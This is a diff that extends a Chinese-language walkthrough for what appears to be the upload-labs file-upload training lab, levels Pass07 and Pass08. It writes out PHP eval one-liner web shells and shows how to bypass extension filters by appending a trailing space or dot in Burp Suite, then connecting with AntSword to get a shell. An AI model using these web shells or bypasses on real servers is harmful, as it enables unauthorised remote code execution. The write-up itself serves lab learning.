@@ -591,6 +591,8 @@ ps: 蚁剑相关的文档查看对应的url:
 
 ## Pass07
 
+### 方法一
+
 + 首先查看源码，对比上一关发现少了收尾去空
 
 ![Pass07_1](./img/Pass07_1.png)
@@ -611,5 +613,154 @@ ps: 蚁剑相关的文档查看对应的url:
 
 
 
+### 方法二
+
++ 首先编写脚本<code>SevenSecondMethod.php</code>
+
+~~~ shell
+<?php @eval($_POST['SevenSecond']); ?>
+~~~
+
+![Pass07_5](./img/Pass07_5.PNG)
+
+
+
++ 上传相应的后台脚本<code>SevenSecondMethod.php</code>
+
+![Pass07_6](./img/Pass07_6.PNG)
+
+
+
++ 用<code>burpsuite</code>拦截然后修改<code>SevenSecondMethod.php</code>为<code>SevenSecondMethod.php </code>即在文件后面加一个空格，然后发现上传成功
+
+![Pass07_7](./img/Pass07_7.png)
+
+
+
++ 右键打开图片网址找到上传文件<code>SevenSecondMethod.php</code>的网址
+
+![Pass07_8](./img/Pass07_8.png)
+
+![Pass07_9](./img/Pass07_9.png)
+
+
+
++ 在蚁剑添加数据，并配置相应的参数，<code>URL地址</code>填写上传文件的网址，<code>连接密码</code>根据脚本<code>SevenSecondMethod.php</code>里的数据填写
+
+![Pass07_10](./img/Pass07_10.png)
+
+
+
++ 配置成功后发现可连接成功
+
+![Pass07_11](./img/Pass07_11.PNG)
+
+
+
++ 双击已经添加的数据，发现<code>getshell</code>成功
+
+![Pass07_12](./img/Pass07_12.PNG)
+
 ## Pass08
 
+
+
+### 方法一
+
++ 首次查看提示
+
+![Pass08_1](./img/Pass08_1.PNG)
+
+
+
++ 查看源代码，发现缺少了<code>deldot</code>函数（用于删除文件名最后一个点，如果有多个连续的.... 会全部删除）。但是依据<code>Windows</code>系统保存文件的特性同样会删除文件后缀名的<code>xxx.php.</code>最后的点<code>.</code> 则最后上传的文件还是<code>xxx.php</code>
+
+![Pass08_2](./img/Pass08_2.PNG)
+
+
+
++ 编写相应的脚本文件<code>EightFirstMethod.php</code>
+
+~~~ shell
+<?php phpinfo(); ?>
+~~~
+
+![Pass08_3](./img/Pass08_3.PNG)
+
+
+
++ 上传相应的脚本文件<code>EightFirstMethod.php</code>
+
+![Pass08_5](./img/Pass08_5.PNG)
+
+
+
++ 上传后用<code>burpsuite</code>拦截并将<code>EightFirstMethod.php</code>的后缀名添加点号<code>.</code>变为<code>EightFirstMethod.php.</code>
+
+![Pass08_6](./img/Pass08_6.png)
+
+
+
++ 上传后右键打开相应的文件
+
+![Pass08_8](./img/Pass08_8.png)
+
+
+
++ 最后发现脚本成功执行
+
+![Pass08_9](./img/Pass08_9.png)
+
+
+
+### 方法二
+
++ 首先编写相应的脚本文件<code>EightSecondMethod.php</code>
+
+~~~ shell
+<?php @eval($_POST['EightSecond']); ?>
+~~~
+
+![Pass08_4](./img/Pass08_4.PNG)
+
+
+
++ 上传相应的脚本文件<code>EightSecondMethod.php</code>
+
+![Pass08_10](./img/Pass08_10.png)
+
+
+
++ 上传后用<code>burpsuite</code>拦截并将<code>EightSecondMethod.php</code>的后缀名添加点号<code>.</code>变为<code>EightSecondMethod.php.</code>
+
+![Pass08_11](./img/Pass08_11.png)
+
+
+
++ 上传后右键打开相应的文件
+
+![Pass08_12](./img/Pass08_12.png)
+
+
+
++ 打开相应的文件后复制对应的文件网址
+
+![Pass08_13](./img/Pass08_13.png)
+
+
+
++ 用蚁剑添加数据并配置相应的参数，<code>URL地址</code>填写上传文件的网址，<code>连接密码</code>根据脚本<code>EightSecondMethod.php</code>里的数据填写
+
+![Pass08_14](./img/Pass08_14.png)
+
+
+
++ 配置后测试发现连接成功
+
+![Pass08_15](./img/Pass08_15.png)
+
+
+
++ 双击已经添加的数据，发现成功<code>getshell</code>
+
+![Pass08_16](./img/Pass08_16.PNG)
